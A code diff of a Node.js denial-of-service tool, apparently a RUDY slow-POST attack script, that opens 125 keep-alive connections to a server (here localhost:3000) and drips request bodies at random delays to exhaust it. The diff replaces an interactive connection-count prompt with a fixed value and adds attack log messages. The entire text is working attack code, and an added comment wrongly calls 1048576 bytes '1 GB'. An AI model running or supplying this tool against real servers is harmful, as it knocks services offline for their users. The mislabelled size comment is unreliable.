@@ -2,21 +2,16 @@ const request = require('request')
 const useragent = require('random-useragent')
 const rp = require('request-promise')
 const fs = require('fs')
-const readline = require('readline-promise').default
 
 let stream = fs.createReadStream('payload.txt')
 
 const host = 'http://127.0.0.1:3000'
-
-const rlp = readline.createInterface({
-  input: process.stdin,
-  output: process.stdout,
-  terminal: true
-})
+const connections = 125
 
 function setupStream() {
   stream._read = () => {
     setTimeout(() => {
+      console.log('Sending 1B of data')
       stream.push('payload.txt')
     }, (Math.random() * 10 + 1) * 1000)
   }
@@ -27,7 +22,7 @@ const options = {
   uri: host,
   headers: {
     'Connection': 'keep-alive',
-    'Content-Length': '1048576',
+    'Content-Length': '1048576', //1 GB of data
     'User-Agent': useragent.getRandom()
   },
   formData: {
@@ -38,20 +33,16 @@ const options = {
 rudyAttack()
 
 function rudyAttack() {
-  rlp.questionAsync('How many connections? ').then(c => {
-    const connections = c ? c : 5000
-
-    for(let i = 0; i < connections; i++) {
-      setupStream()
-      attack()
-    }
-  })
+  console.log('---Attack initiated---')
+  for(let i = 0; i < connections; i++) {
+    setupStream()
+    attack()
+  }
 }
 
 function attack() {
   rp(options)
   .then(() => {
-    console.log('Request initiated')
     closeStream()
   })
   .catch(err => {
